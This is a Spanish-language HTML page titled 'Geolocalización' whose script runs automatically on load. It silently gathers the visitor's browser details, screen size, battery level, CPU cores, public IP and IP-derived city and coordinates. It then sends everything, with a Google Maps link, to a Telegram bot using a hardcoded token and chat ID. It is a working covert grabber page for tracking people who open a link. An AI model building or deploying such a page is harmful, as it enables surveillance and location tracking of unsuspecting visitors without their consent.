<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocalización</title>
</head>
<body>
    <h1>Obteniendo Información del Dispositivo...</h1>
    <script>
        // Función para obtener la información del dispositivo y enviar el mensaje a Telegram
        function obtenerInformacion() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const windowWidth = window.innerWidth;
            const windowHeight = window.innerHeight;
            const fecha = new Date().toLocaleDateString();
            const hora = new Date().toLocaleTimeString();

            // Obtener la información de la batería
            navigator.getBattery().then(function(battery) {
                const batteryLevel = battery.level * 100 + "%";
                const batteryInfo = `Nivel de batería: ${batteryLevel}`;

                // Obtener la información del CPU
                const cpuInfo = navigator.hardwareConcurrency ? `Número de núcleos del CPU: ${navigator.hardwareConcurrency}` : 'Información de CPU no disponible';

                // Obtener la IP pública y luego hacer la solicitud a ipstack para obtener la ubicación precisa
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;

                        // Solicitar la ubicación precisa basada en la IP
                        obtenerUbicacionPorIP(ip, userAgent, platform, language, screenWidth, screenHeight, windowWidth, windowHeight, fecha, hora, batteryInfo, cpuInfo);
                    })
                    .catch(error => {
                        console.error('Error al obtener la IP:', error);
                    });
            });
        }

        // Función para obtener la ubicación más precisa posible a partir de la IP
        function obtenerUbicacionPorIP(ip, userAgent, platform, language, screenWidth, screenHeight, windowWidth, windowHeight, fecha, hora, batteryInfo, cpuInfo) {
            const apiKey = 'TU_API_KEY_DE_IPSTACK';  // Tu API key de ipstack
            const url = `http://api.ipstack.com/${ip}?access_key=${apiKey}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    const location = data.city || 'Desconocida';
                    const region = data.region_name || 'Desconocida';
                    const country = data.country_name || 'Desconocido';
                    const latitude = data.latitude || 'Desconocida';
                    const longitude = data.longitude || 'Desconocida';
                    const ipInfo = `Ubicación: ${location}, ${region}, ${country}`;
                    const geoLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

                    // Llamar a la función para enviar el mensaje a Telegram con la nueva información
                    enviarMensajeTelegram(userAgent, platform, language, screenWidth, screenHeight, windowWidth, windowHeight, fecha, hora, batteryInfo, cpuInfo, ip, location, region, country, latitude, longitude, geoLink);
                })
                .catch(error => {
                    console.error('Error al obtener la ubicación precisa:', error);
                });
        }

        // Función para enviar un mensaje a Telegram con los datos del dispositivo y la ubicación precisa
        function enviarMensajeTelegram(userAgent, platform, language, screenWidth, screenHeight, windowWidth, windowHeight, fecha, hora, batteryInfo, cpuInfo, ip, location, region, country, latitude, longitude, geoLink) {
            const token = '7924985646:AAEETELAHSccchjrQHbDQ0l_Yzhdo94T1wU';  // Tu token
            const chat_id = '7270292739';  // Tu chat ID
            const message = `Información del dispositivo:\n
            User Agent: ${userAgent}\n
            Plataforma: ${platform}\n
            Idioma: ${language}\n
            Resolución de pantalla: ${screenWidth}x${screenHeight}\n
            Resolución de ventana: ${windowWidth}x${windowHeight}\n
            Fecha: ${fecha}\n
            Hora: ${hora}\n
            ${batteryInfo}\n
            ${cpuInfo}\n
            IP: ${ip}\n
            Ubicación: ${location}, ${region}, ${country}\n
            Latitud: ${latitude}, Longitud: ${longitude}\n
            Enlace a Google Maps: ${geoLink}`;

            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

            // Hacer la solicitud HTTP GET para enviar el mensaje
            fetch(telegramUrl)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Mensaje enviado exitosamente:', data);
                    } else {
                        console.error('Hubo un problema al enviar el mensaje:', data);
                    }
                })
                .catch(error => {
                    console.error('Error al intentar enviar el mensaje:', error);
                });
        }

        // Llamar a la función para obtener la información del dispositivo cuando la página se carga
        window.onload = obtenerInformacion;
    </script>
</body>
</html>
